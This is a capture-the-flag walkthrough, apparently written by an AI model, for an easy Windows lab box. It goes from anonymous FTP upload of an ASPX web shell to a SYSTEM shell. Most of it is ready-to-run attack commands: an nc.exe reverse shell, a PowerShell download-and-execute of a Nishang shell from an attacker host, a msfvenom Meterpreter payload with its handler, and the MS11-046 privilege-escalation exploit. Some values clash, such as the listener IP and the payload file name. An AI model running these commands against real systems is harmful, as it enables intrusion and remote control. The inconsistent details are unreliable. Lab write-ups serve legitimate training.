## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)


## 🧭 Reconnaissance

**Full port scan:**
```bash
nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
```

**Targeted version/service scan:**
```bash
nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
```

---

## 🌐 [Web](HTTP) & [FTP](FTP) Enumeration

**Check FTP access (Anonymous allowed):**
```bash
ftp 10.10.10.5
# Login: anonymous / [blank]
```

**Identify if FTP root = Web root:**
```bash
# Upload test file or observe files:
put test.html
# Check in browser: http://10.10.10.5/test.html
```

**Check headers for ASP.NET support (e.g. using Burp):**
```
X-Powered-By: ASP.NET
```

---

## 📥 Initial Foothold (Webshell Upload)

**Copy a basic ASPX web shell:**
```bash
cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
```

**Upload via FTP:**
```bash
ftp> put cmd.aspx
```

**Access webshell:**
```
http://10.10.10.5/cmd.aspx
```

**Execute command (example):**
```
whoami
```

---

## 🐚 Reverse [Shell](SSH) (Multiple Methods)

### Option 1: Netcat

**Start SMB share:**
```bash
mkdir smb
cp /usr/share/windows-binaries/nc.exe smb/
sudo smbserver.py share smb
```

**Start listener:**
```bash
nc -lnvp 443
```

**From webshell:**
```cmd
\\10.10.14.14\share\nc.exe -e cmd.exe 10.10.14.14 443
```

---

### Option 2: Nishang (PowerShell TCP)

**Edit and host reverse shell:**
```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 smb/
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 443" >> smb/Invoke-PowerShellTcp.ps1
python3 -m http.server 80
```

**From webshell:**
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcp.ps1')"
```

---

### Option 3: Meterpreter

**Generate payload:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=666 -f aspx -o met_rev_666.aspx
```

**Upload via FTP:**
```bash
ftp> put met_rev_666.aspx
```

**Start handler:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.13
set LPORT 666
run
```

**Trigger callback:**
```
curl http://10.10.10.5/met_rev_443.aspx
```

---

## 🔧 Privilege Escalation

```
getuid
```

```
systeminfo
```

**Check .NET versions:**
```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

**Use [Watson](https://github.com/rasta-mouse/Watson) (uploaded via SMB):**
```cmd
\\10.10.14.14\share\Watson.exe
```

https://github.com/abatchy17/WindowsExploits

https://www.exploit-db.com/exploits/40564

**Pick MS11-046 (example):**
```bash
wget https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe
```

**Upload and run:**
```cmd
C:\inetpub\wwwroot\MS11-046.exe
```

**Confirm SYSTEM shell:**
```cmd
whoami
```

---

## 🎯 Flags

```cmd
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

Let me know if you want this exported as a Markdown file or want to move on to another box! 💥